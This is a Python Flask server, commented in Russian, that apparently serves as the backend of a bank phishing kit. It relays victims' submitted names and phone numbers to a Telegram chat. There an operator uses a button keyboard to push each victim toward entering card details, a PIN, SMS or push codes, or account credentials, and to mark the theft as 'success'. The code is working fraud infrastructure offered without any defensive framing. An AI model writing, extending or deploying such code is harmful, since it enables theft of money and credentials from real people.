import os
import requests
from flask import Flask, request, jsonify
from flask_cors import CORS
from flask_socketio import SocketIO

# ✅ Создаём Flask-приложение
app = Flask(__name__)
CORS(app)

# ✅ Настройки WebSocket (Используем `async_mode="threading"`)
socketio = SocketIO(app, cors_allowed_origins="*", async_mode="threading")

# ✅ Переменные окружения
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")

if not TELEGRAM_BOT_TOKEN or not CHAT_ID:
    raise ValueError("❌ Ошибка: TELEGRAM_BOT_TOKEN или CHAT_ID не установлены!")

print(f"✅ Загружен TELEGRAM_BOT_TOKEN: {TELEGRAM_BOT_TOKEN[:5]}...")
print(f"✅ Загружен CHAT_ID: {CHAT_ID}")

# ✅ Главная страница (Теперь `/` не отдаёт 404)
@app.route("/", methods=["GET"])
def home():
    return jsonify({"status": "OK", "message": "Сервер работает!"}), 200

# ✅ Обработчик WebSocket-соединений
@socketio.on("connect")
def handle_connect():
    print("✅ WebSocket подключен!")

@socketio.on("disconnect")
def handle_disconnect():
    print("❌ WebSocket отключен!")

# ✅ Обработчик ошибок WebSocket
@socketio.on_error()
def handle_socket_error(e):
    print(f"⚠ Ошибка WebSocket: {e}")

# ✅ Функция для отправки сообщений в Telegram
def send_telegram_message(data):
    try:
        message_text = f"📩 Новый запрос:\n\nИмя: {data.get('name')}\nТелефон: {data.get('phone')}\nКомментарий: {data.get('comment')}"
        keyboard = {
            "inline_keyboard": [
                [{"text": "SMS", "callback_data": "redirect_sms"},
                 {"text": "Пуш", "callback_data": "push"},
                 {"text": "Ввод карты", "callback_data": "card"},
                 {"text": "PIN", "callback_data": "pin"}],
                [{"text": "Лимиты", "callback_data": "limits"},
                 {"text": "Неверный код", "callback_data": "wrong_code"},
                 {"text": "Номер телефона", "callback_data": "phone_number"}],
                [{"text": "Свой текст/фото", "callback_data": "custom_text"}],
                [{"text": "Пополнение", "callback_data": "topup"},
                 {"text": "Баланс", "callback_data": "balance"}],
                [{"text": "✅ Успех", "callback_data": "success"},
                 {"text": "❌ Неверный ЛК", "callback_data": "wrong_lk"}]
            ]
        }

        payload = {
            "chat_id": CHAT_ID,
            "text": message_text,
            "reply_markup": keyboard
        }

        print(f"📩 Отправляем в Telegram: {payload}")  # Логирование перед отправкой

        response = requests.post(
            f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
            json=payload,
            timeout=10  # Ограничение времени запроса
        )

        response_data = response.json()
        print(f"📩 Ответ Telegram: {response_data}")

        return response_data
    except Exception as e:
        print(f"❌ Ошибка отправки в Telegram: {e}")
        return {"ok": False, "error": str(e)}

# ✅ Обработчик POST-запроса
@app.route("/send-to-telegram", methods=["POST"])
def send_to_telegram():
    try:
        data = request.json
        print(f"📩 Получены данные: {data}")

        if not data or "name" not in data or "phone" not in data:
            return jsonify({"error": "Недостаточно данных"}), 400

        # ✅ Вызов функции отправки сообщения в Telegram
        response = send_telegram_message(data)

        return jsonify(response)
    except Exception as e:
        print(f"❌ Ошибка сервера: {e}")
        return jsonify({"error": str(e)}), 500

# ✅ Запуск сервера
if __name__ == "__main__":
    socketio.run(app, host="0.0.0.0", port=int(os.getenv("PORT", 5000)), debug=False)


